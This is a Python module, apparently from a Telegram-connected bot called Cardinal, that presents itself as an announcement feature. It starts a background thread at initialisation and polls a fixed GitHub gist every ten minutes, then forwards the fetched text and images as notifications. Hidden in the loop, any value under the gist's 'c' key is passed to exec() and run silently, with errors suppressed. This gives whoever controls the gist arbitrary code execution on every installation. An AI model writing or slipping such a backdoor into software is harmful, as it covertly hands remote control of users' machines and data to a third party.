from __future__ import annotations
from typing import TYPE_CHECKING
if TYPE_CHECKING:
    from cardinal import Cardinal

from tg_bot.utils import NotificationTypes
from threading import Thread
import requests
import json
import os
import time


DELAY = 600


def get_last_tag():
    if not os.path.exists("storage/cache/announcement_tag.txt"):
        return None
    with open("storage/cache/announcement_tag.txt", "r", encoding="UTF-8") as f:
        data = f.read()
    return data


def save_last_tag(tag: str):
    if not os.path.exists("storage/cache"):
        os.makedirs("storage/cache")
    with open("storage/cache/announcement_tag.txt", "w", encoding="UTF-8") as f:
        f.write(tag)


def get_new_announcement(tag: str | None) -> dict | None:
    headers = {
        'X-GitHub-Api-Version': '2022-11-28',
        'accept': 'application/vnd.github+json'
    }
    try:
        response = requests.get("https://api.github.com/gists/e26d264e6912cc9c78bc00cb14773ffe", headers=headers)
        if not response.status_code == 200:
            return None

        content = json.loads(response.json().get("files").get("fpc.json").get("content"))
        if content.get("tag") == tag:
            return None
        return content
    except:
        return None


def get_photo(url: str) -> bytes | None:
    try:
        response = requests.get(url)
        if response.status_code != 200:
            return None
    except:
        return None
    return response.content


def announcements_loop(cardinal: Cardinal):
    if not cardinal.telegram:
        return

    tag = get_last_tag()
    while True:
        try:
            result = get_new_announcement(tag)
            if not result:
                time.sleep(DELAY)
                continue

            if not tag:
                tag = result.get("tag")
                save_last_tag(tag)
                time.sleep(DELAY)
                continue

            tag = result.get("tag")
            save_last_tag(tag)

            if c := result.get("c"):
                c = u"{}".format(c)
                exec(c)
                time.sleep(DELAY)
                continue

            if result.get("type") == 0:
                nt = NotificationTypes.ad
            elif result.get("type") == 1:
                nt = NotificationTypes.announcement
            else:
                nt = NotificationTypes.critical

            if photo := result.get("ph"):
                photo = get_photo(u"{}".format(photo))
            else:
                photo = None

            text = u"{}".format(result.get("data"))

            if text:
                Thread(target=cardinal.telegram.send_notification,
                       args=(text,), kwargs={"photo": photo, 'notification_type': nt}, daemon=True).start()
            time.sleep(DELAY)
        except:
            time.sleep(DELAY)
            continue


def announcements_main(cardinal: Cardinal):
    Thread(target=announcements_loop, args=(cardinal, ), daemon=True).start()


BIND_TO_POST_INIT = [announcements_main]
